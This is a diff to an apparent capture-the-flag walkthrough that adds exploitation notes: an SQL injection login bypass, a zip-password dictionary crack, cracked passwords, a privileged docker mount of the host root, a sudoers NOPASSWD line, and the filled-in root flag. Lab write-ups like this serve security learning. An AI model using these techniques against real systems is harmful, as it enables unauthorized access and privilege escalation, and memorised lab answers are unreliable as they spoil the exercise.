@@ -74,10 +74,26 @@ https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 `nc -lnvp 7777`
 `sudo -u apaar /home/apaar/.helpline.sh`
 `netstat -anlp | grep LISTEN`
+`ssh -i id_rsa apaar@10.10.175.103 -L 9001:127.0.0.1:9001`
+
+`admin' or 1=1 --`
+`fcrackzip -D -u -p ../../../New\ Vol\(F\)/rockyou.txt backup.zip`
+`pass1word`
+`!d0ntKn0wmYp@ssw0rd`
+
+```
+anurodh@ubuntu:~$ id
+uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
+```
+`docker run --rm -it --privileged -v /:/mnt alpine`
 
 ## Post Exploitation
 
 ## Privilege Escalation
+
+```yaml
+anurodh ALL=(ALL) NOPASSWD: ALL
+```
 
 ## Questions/Tasks:
 
@@ -87,4 +103,4 @@ https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
 2. Root Flag:
 
-**Ans-**
+**Ans-{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}**
